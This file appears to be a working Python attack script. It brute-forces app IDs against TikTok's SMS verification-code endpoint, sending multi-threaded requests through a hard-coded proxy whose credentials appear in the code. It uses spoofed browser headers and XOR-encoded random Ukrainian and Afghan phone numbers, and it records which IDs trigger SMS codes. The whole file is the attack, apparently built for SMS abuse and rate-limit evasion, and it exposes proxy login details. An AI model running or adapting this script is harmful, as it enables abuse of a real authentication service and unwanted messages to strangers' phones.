"""
AID Brute Force Scanner — Tests AIDs 1 to 10000 on ByteDance web endpoint.
Uses /passport/web/send_code/ on www.tiktok.com (no signing needed).
Multi-threaded for speed.
"""
import requests
import random
import time
import json
import sys
import os
import urllib3
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

urllib3.disable_warnings()

PROXY = 'http://user-2pbGchwGYvoGSTLv-type-datacenter-country-US:j8BogunPuMmSaOEU@geo.g-w.info:10080'
DOMAIN = "www.tiktok.com"
ENDPOINT = "/passport/web/send_code/"
TYPE_CODES = [3635, 3733, 3631, 3637, 3634, 3734]

# Progress tracking
lock = threading.Lock()
completed = 0
successes = []
rate_limited = []
errors_16 = []  # no permissions
other_results = []

phones_used = set()
phone_lock = threading.Lock()

def fresh_phone():
    with phone_lock:
        while True:
            prefix = random.choice(['+38050', '+38067', '+38096', '+38097', '+38099',
                                    '+93070', '+93072', '+93073', '+93074', '+93075',
                                    '+93078', '+93079'])
            p = prefix + str(random.randint(1000000, 9999999))
            if p not in phones_used:
                phones_used.add(p)
                return p

def xor_encrypt(phone):
    return ''.join(format(ord(c) ^ 5, '02x') for c in phone)

def test_aid(aid):
    global completed
    phone = fresh_phone()
    encrypted = xor_encrypt(phone)
    tc = random.choice(TYPE_CODES)
    
    body = urlencode({
        "mobile": encrypted, "type": str(tc),
        "aid": str(aid), "app_name": "tiktok_web",
        "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
    })
    url = f"https://{DOMAIN}{ENDPOINT}?aid={aid}&app_name=tiktok_web"
    headers = {
        "Host": DOMAIN,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": f"https://{DOMAIN}",
        "Referer": f"https://{DOMAIN}/",
        "X-SS-DP": str(aid),
    }
    
    session = requests.Session()
    session.proxies = {"http": PROXY, "https": PROXY}
    
    try:
        resp = session.post(url, data=body, headers=headers, verify=False, timeout=12)
        d = resp.json()
        msg = d.get("message", "")
        ec = d.get("data", {}).get("error_code") if isinstance(d.get("data"), dict) else None
        
        with lock:
            completed += 1
            if msg == "success":
                successes.append({"aid": aid, "tc": tc, "phone": phone})
                print(f"\r  *** SUCCESS *** AID={aid} tc={tc} phone={phone}                    ")
            elif ec == 7:
                rate_limited.append({"aid": aid, "tc": tc})
                print(f"\r  ** RATE_LIMITED ** AID={aid} tc={tc} (=works, IP throttled)          ")
            elif ec == 16:
                errors_16.append(aid)
            else:
                desc = (d.get("data", {}).get("description", "") or "")[:50] if isinstance(d.get("data"), dict) else ""
                other_results.append({"aid": aid, "status": resp.status_code, "msg": msg, "ec": ec, "desc": desc})
                if ec not in (None, 16) and ec != 1105:
                    print(f"\r  ? AID={aid} msg={msg} ec={ec} {desc[:30]}                    ")
            
            if completed % 100 == 0:
                print(f"\r  Progress: {completed}/10000 | SUCCESS: {len(successes)} | RATE_LIMITED: {len(rate_limited)} | ec16: {len(errors_16)}", end="", flush=True)
        
        return {"aid": aid, "msg": msg, "ec": ec}
    except Exception as e:
        with lock:
            completed += 1
            if completed % 100 == 0:
                print(f"\r  Progress: {completed}/10000 | SUCCESS: {len(successes)} | RATE_LIMITED: {len(rate_limited)}", end="", flush=True)
        return {"aid": aid, "msg": "error", "ec": -1, "error": str(e)[:50]}
    finally:
        session.close()

def save_results():
    results = {
        "successes": successes,
        "rate_limited": rate_limited,
        "other_interesting": [r for r in other_results if r.get("ec") not in (None, 16, 1105)],
        "total_tested": completed,
        "total_ec16": len(errors_16),
    }
    with open("/home/ubuntu/aid_bruteforce_results.json", "w") as f:
        json.dump(results, f, indent=2)

def main(start=None, end=None, workers=None):
    global completed
    START = int(sys.argv[1]) if start is None and len(sys.argv) > 1 else (start if start is not None else 1)
    END = int(sys.argv[2]) if end is None and len(sys.argv) > 2 else (end if end is not None else 10001)
    WORKERS = int(sys.argv[3]) if workers is None and len(sys.argv) > 3 else (workers if workers is not None else 20)

    aids = list(range(START, END))
    random.shuffle(aids)

    print(f"AID BRUTE FORCE: {START} to {END-1} ({len(aids)} AIDs)")
    print(f"Workers: {WORKERS} | Domain: {DOMAIN} | Endpoint: {ENDPOINT}")
    print("=" * 70)

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(test_aid, aid): aid for aid in aids}
        try:
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        except KeyboardInterrupt:
            print("\n\nInterrupted! Saving partial results...")

    elapsed = time.time() - start_time
    
    print(f"\n\n{'='*70}")
    print(f"BRUTE FORCE COMPLETE: {completed} AIDs tested in {elapsed:.0f}s ({completed/elapsed:.1f} req/s)")
    print(f"{'='*70}")
    
    print(f"\n*** SUCCESSES ({len(successes)}) ***")
    for s in successes:
        print(f"  AID={s['aid']} tc={s['tc']} phone={s['phone']}")
    
    print(f"\n** RATE LIMITED ({len(rate_limited)}) — these WORK but IP throttled **")
    for r in rate_limited:
        print(f"  AID={r['aid']} tc={r['tc']}")
    
    interesting = [r for r in other_results if r.get("ec") not in (None, 16, 1105)]
    if interesting:
        print(f"\n? OTHER INTERESTING ({len(interesting)}) ?")
        for r in interesting:
            print(f"  AID={r['aid']} ec={r['ec']} msg={r['msg']} {r.get('desc', '')[:40]}")
    
    print(f"\n  ec=16 (no permissions): {len(errors_16)} AIDs")
    print(f"  Total tested: {completed}")
    
    save_results()
    print(f"\nResults saved to /home/ubuntu/aid_bruteforce_results.json")


if __name__ == "__main__":
    main()
